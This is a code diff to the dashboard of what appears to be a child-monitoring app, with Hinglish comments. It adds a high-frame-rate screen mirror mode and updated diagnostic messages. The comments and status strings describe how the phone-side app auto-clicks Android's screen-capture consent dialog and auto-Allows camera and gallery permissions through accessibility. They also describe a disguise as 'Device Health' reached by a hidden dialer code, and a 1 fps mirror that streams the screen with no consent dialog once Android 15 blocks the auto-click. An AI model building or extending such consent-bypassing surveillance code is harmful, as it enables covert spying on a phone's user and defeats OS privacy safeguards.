@@ -11,8 +11,8 @@
 // consent auto-click ab SAARI a11y windows scan karta hai + honest diag
 // (clickPassRuns/SawBtn/dialogPkg/consentResult) se Phone check exact batata hai
 // ki Live ke liye child par "Start now" manually dabana hai ya nahi.
-const LATEST_VC = 14;
-const LATEST_V = "1.13";
+const LATEST_VC = 15;
+const LATEST_V = "1.14";
 
 const S = {
   token: localStorage.getItem("fg_token") || "",
@@ -1419,11 +1419,11 @@ function renderMirrorDiag(d) {
         ? " · auto-click ne dialog ka button DEKHA par confirm nahi hua (Android 15 protection)"
         : " · auto-click ne “Start now” button DEKHA HI NAHI (a11y window list me dialog nahi aaya)";
     }
-    rows.push("<li>⏳ <b>Consent dialog:</b> request ho chuki hai, abhi grant nahi hui — 5–10 sec ruko" + extra + "</li>");
+    rows.push("<li>⏳ <b>Consent dialog:</b> request ho chuki hai, abhi grant nahi hui" + (sdk != null && sdk >= 35 ? " — Android 15 par auto-click system-block hai: bachche se dialog ka \u201cStart now\u201d tap karwao (ya 1 fps fallback chalne do)" : " — 5–10 sec ruko") + extra + "</li>");
   }
   if (d.capturePending) rows.push("<li>📸 <b>Screenshot:</b> consent ka intezaar — sirf Android <13 / a11y OFF par hota hai; build 13 se screenshot a11y se aata hai, consent chahiye hi nahi</li>");
   rows.push(diagRow(d.screenOn === true, "Bachche ki screen", d.screenOn ? "ON ✓" : "OFF — frames isliye nahi aa rahe", d.screenOn ? "" : "Phone screen ON karo, frames khud aane lagenge"));
-  rows.push(diagRow(h.mirrorReady === true, "Screen capture consent", h.mirrorReady ? "granted ✓" : "abhi nahi", h.mirrorReady ? "" : "Mirror shuru dabao — dialog khud khulega aur confirm hoga"));
+  rows.push(diagRow(h.mirrorReady === true, "Screen capture consent", h.mirrorReady ? "granted ✓" : "abhi nahi", h.mirrorReady ? "" : (sdk != null && sdk >= 35 ? "Normal Mirror bina dialog ke 1 fps fallback se chalta hai. 8 fps HQ ke liye 🎯 button dabao — bachche se “Start now” tap karwao" : "Mirror shuru dabao — dialog khud khulega aur confirm hoga")));
   rows.push(diagRow(h.accessibility !== false, "Accessibility", h.accessibility === false ? "OFF" : "ON ✓", h.accessibility === false ? "Settings → Accessibility → Device Health → ON (consent auto-confirm isi se hota hai)" : ""));
   // FRESH-INSTALL DIAG (vc12): gallery/camera permission rows — teeno features
   // (mirror/gallery/camera) accessibility par depend karte hain; pehle Phone
@@ -1455,11 +1455,11 @@ function renderMirrorDiag(d) {
   else if (d.galleryPerm === false) verdict = "👉 <b>Gallery permission nahi mili — Live tab me “📸 Gallery kholo” dobara dabao: permission dialog khud khulega aur auto-Allow ho jayega (5 sec me).</b>";
   else if (d.cameraPerm === false) verdict = "👉 <b>Camera permission nahi mili — Quick actions me “📷 Back cam” dobara dabao: dialog khud Allow ho jayega, phir shot lag jayega.</b>";
   else if (h.overlay === false) verdict = "👉 <b>Display over apps OFF hai — background me consent khulti hi nahi. Allow karo, phir dobara try karo.</b>";
+  else if (d.fallbackActive === true) verdict = "👉 🐢 <b>Mirror a11y fallback mode me LIVE hai (~1 fps)</b> — Live tab par screen dikh rahi hogi (har ~1 sec update). Ye safe mode hai: Android 15 par system consent dialog ka auto-click block karta hai, isliye bina dialog ke live chal raha hai. Real-time <b>8 fps</b> chahiye to <b>🎯 HQ 8 fps</b> dabao aur bachche ke phone par dialog ka <b>“Start now”</b> ek baar khud daba do.";
   else if (d.consentPending && d.consentUiSeen === false) verdict = "👉 <b>Consent dialog bachche ke phone par khula HI nahi (OEM ne block kiya). Bachche ke phone par Device Health app ek baar kholo (dial *#*#2724#*#*), phir Live tab se Mirror dobara shuru karo.</b>";
   else if (d.consentPending && d.consentResult === "denied") verdict = "👉 <b>Pichhli baar consent dialog par CANCEL dab gaya tha. Mirror band karke dobara shuru karo — dialog aaye to “Start now” dabana zaroori hai (Live streaming ke liye Android ko har baar permission chahiye).</b>";
-  else if (d.consentPending && d.clickPassRuns > 0 && d.clickPassSawBtn === false) verdict = "👉 <b>Dialog khula par a11y click ko dialog nahi dikha. Naya build (14) real touch (gesture tap) bhi try karta hai — phir bhi na ho to Mirror apne aap 1 fps fallback me chal jayega (Live dikhega).</b>";
-  else if (d.consentPending && d.clickPassSawBtn === true) verdict = "👉 <b>Auto-click ne \u201cStart now\u201d dekha par ACTION_CLICK ignore hua — naya build (14) ab real touch (gesture tap) se confirm karega. Agar wo bhi na chale to Mirror khud 1 fps fallback mode me live dikhega.</b>";
-  else if (d.fallbackActive === true) verdict = "👉 🐢 <b>Mirror a11y fallback mode me LIVE hai (~1 fps)</b> — Live tab par screen dikh rahi hogi. Ye safe mode hai jab consent dialog auto-confirm nahi hota; real-time 8 fps ke liye bachche ke phone par ek baar dialog ka “Start now” khud dabao.";
+  else if (d.consentPending && d.clickPassRuns > 0 && d.clickPassSawBtn === false) verdict = "👉 <b>Dialog khula par a11y click ko dialog nahi dikha — Mirror khud 1 fps fallback me live chal jayega (2–3 sec me). HQ 8 fps ke liye 🎯 button dabao aur bachche se dialog ka “Start now” tap karwao.</b>";
+  else if (d.consentPending && d.clickPassSawBtn === true) verdict = "👉 <b>Auto-click ne \u201cStart now\u201d dekha par Android 15 ne click ignore kar diya (system protection — vc14 ka gesture tap bhi block hai). Mirror 1 fps fallback me live hai/hoga. Real-time 8 fps ke liye 🎯 HQ button dabao aur bachche se \u201cStart now\u201d ek baar tap karwao.</b>";
   else if (d.consentPending) verdict = "👉 <b>Consent abhi confirm ho raha hai — 10 sec ruko. Phir bhi screen na aaye to Mirror band karke dobara shuru karo.</b>";
   else if ((d.frames || 0) === 0 && h.mirrorReady !== true) verdict = "👉 <b>Capture session start nahi hua — Mirror band karo, 5 sec ruko, phir dobara “▶ Mirror shuru karo” dabao.</b>";
   else verdict = "👉 <b>Phone side theek lag raha hai — 5–10 sec me frames aane chahiye. Nahi aaye to Mirror band → dobara shuru karo.</b>";
@@ -1524,7 +1524,7 @@ setInterval(() => {
     mirrorStatus(
       fresh && S.mirrorChildReason
         ? S.mirrorChildReason
-        : "Frames nahi aa rahe (" + Math.round(idle / 1000) + "s) — bachche ka screen OFF hai ya consent abhi confirm ho raha hai. Bachche ka phone screen ON karo, ya “🔍 Phone check” dabao — phone khud batayega dikkat kya hai.",
+        : "Frames nahi aa rahe (" + Math.round(idle / 1000) + "s) — bachche ka screen OFF hai ya consent block hai. “🔍 Phone check” dabao — phone khud batayega. (Build 15+ me Mirror 1 fps fallback par bhi live hota hai; 🎯 HQ 8 fps deta hai.)",
       true
     );
   } else {
@@ -1555,9 +1555,27 @@ $("mirror-toggle").onclick = () => {
       if (c && !c.online) {
         mirrorStatus("Bachcha abhi offline hai — command queue ho gayi, connect hote hi mirroring khud shuru ho jayegi.", true);
       } else {
-        mirrorStatus("Screen aa rahi hai… (consent dialog khud confirm ho jata hai — 2–5 sec me frames)", true);
+        mirrorStatus("Screen aa rahi hai… (Android 15+ par 1 fps fallback khud chalu — 2–5 sec me frames; purane Android par dialog auto-confirm hota hai)", true);
       }
     }
+  } else alert("Server se connect nahi hai");
+};
+
+/* vc15: HIGH-QUALITY mirror — consent dialog kholo aur bachche ke haath se
+   "Start now" tap karwao. Android 15 auto-click ko SYSTEM-level block karta
+   hai, isliye ye EK manual tap hi 8 fps real stream ka raasta hai. 1 fps
+   fallback saath me bhi chalta rahega (consent milte hi 8 fps use replace
+   karega — MirrorService pendingMirrorFps se khud start karta hai). */
+$("mirror-hq").onclick = () => {
+  if (!S.cid) return;
+  if (S.ws && S.ws.readyState === 1) {
+    S.ws.send(JSON.stringify({ type: "watch_mirror", cid: S.cid }));
+    S.ws.send(JSON.stringify({ type: "mirror_start", cid: S.cid, hq: true }));
+    setMirrorBtn(true);
+    S.lastFrameAt = Date.now();
+    S.mirrorChildReason = null; S.mirrorChildReasonAt = 0;
+    S.mirrorDiagAutoSent = false;
+    mirrorStatus("🎯 HQ mode: bachche ke phone par consent dialog khol diya — bachche se dialog ka “Start now” TAP karwa do, phir 8 fps real stream khud chalu ho jayega. Tab tak 1 fps fallback chalta rahega.", true);
   } else alert("Server se connect nahi hai");
 };
 
